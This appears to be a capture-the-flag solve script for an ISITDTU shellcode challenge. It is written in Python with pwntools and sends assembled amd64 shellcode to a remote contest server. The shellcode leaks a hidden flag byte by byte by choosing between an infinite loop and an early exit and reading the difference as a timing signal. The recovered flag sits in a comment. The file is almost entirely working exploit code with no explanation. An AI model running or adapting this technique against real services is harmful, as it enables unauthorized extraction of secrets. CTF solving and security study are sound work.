from pwn import *
import string

table = string.printable[:-5]
flag = "ISITDTU{"
#flag = "ISITDTU{y0ur_sh3llc0d3_Sk!LL_s0_g00000d}"
while True:
    x = len(flag)
    for c in table:
        #sock = remote("localhost", 2222)
        sock = remote("209.97.162.170", 2222)
        shellcode = asm("""
        // rdi = XOR KEY
        mov rsi, 0xcafe000
        mov rdi, [rsi]
        mov rbx, 0x7b55544454495349
        xor rdi, rbx

        // shift key
        xor rbx, rbx
        mov al, {x}
        mov bl, 8
        div rbx
        imul rdx, rbx
        mov rcx, rdx
        shr rdi, cl
        mov al, [rsi + {x}]
        xor rax, rdi
        cmp al, {c}
        jz loop
        xor rdi, rdi
        inc edi
        mov rax, 0x25
        syscall
        loop:
        jmp loop
        """.format(x=x, c=ord(c)), arch="amd64")
        assert len(shellcode) < 0x46

        sock.sendline(shellcode)
        try:
            if "timeout" in sock.recv():
                flag += c
                break
        except KeyboardInterrupt:
            exit()
        except:
            flag += c
            break
        sock.close()
    else:
        print("Something went wrong!")
        exit()
    print(flag)
